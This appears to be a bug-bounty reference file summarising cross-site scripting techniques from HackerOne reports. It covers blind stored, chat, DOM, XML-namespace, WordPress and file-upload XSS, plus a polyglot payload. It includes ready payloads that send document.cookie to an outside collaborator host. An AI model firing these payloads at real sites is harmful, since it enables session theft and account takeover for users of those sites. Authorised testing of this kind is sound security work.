---
name: "h1-xss-techniques"
description: "Cross-Site Scripting patterns from HackerOne reports — blind stored XSS in admin panels, DOM-based, stored XSS in chat, XSS via XML namespace, FB integration, WordPress R-XSS"
category: web-security
tags: ["xss", "cross-site-scripting", "stored-xss", "blind-xss", "dom-xss", "hackerone"]
relevance: 10
---

# H1 XSS Testing Techniques

Real-world XSS vulnerabilities with $250-$4000 bounties:

## 1. Blind Stored XSS in Admin Panel
Report: Mail.ru Blind XSS via partner superuser name ($750 × 2)
- Technique: Inject payload into user-controlled fields that admins view
- Targets: Profile name, company name, support ticket subject
- Payload: `<script>fetch('https://collaborator.net/?c='+document.cookie)</script>`
- Payload: `<img src=x onerror=this.src='https://collaborator.net/?c='+document.cookie>`

## 2. Stored XSS in Chat/Messaging
Report: Shopify Stored XSS in customer chat ($1000)
- Technique: Inject script in chat messages
- Payload: `<img src=x onerror=alert(document.domain)>`
- Test: All user-input fields that persist

## 3. XSS via Third-Party Integration
Report: Shopify XSS through FB Group integration ($500)
- Technique: Abuse third-party service names/descriptions
- Test: OAuth app names, integration webhook URLs

## 4. Reflected XSS via XML Namespace
Report: Mapbox Reflected XSS through XML Namespace URI ($500)
- Technique: Inject into XML/SVG processing endpoints
- Payload: `<?xml version="1.0"?><root xmlns:a="http://example.com/<script>alert(1)</script>">`

## 5. DOM-Based XSS
Report: ForeScout DOM XSS in IE/Edge ($1000)
- Technique: Find `innerHTML`, `document.write`, `eval()` with user input
- Test: `#` fragment, `location.hash`, `window.name`, `postMessage`

## 6. WordPress Reflected XSS
Report: Uber Reflected XSS via outdated WordPress ($4000)
- Technique: Scan for old WordPress versions with known XSS
- Test: `/wp-admin/admin-ajax.php`, search parameters

## 7. XSS via File Upload
- Upload SVG with embedded script: `<svg onload=alert(1)>`
- Upload HTML file: `<script>alert(1)</script>`
- PDF upload with JS action

## XSS Polyglot Payload:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A/</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg oNloAd=alert(1)//>\x3e
```

## Detection Tools:
- Use XSS Hunter / interact.sh for blind XSS
- Test every input field: search, forms, URL params, headers, cookies
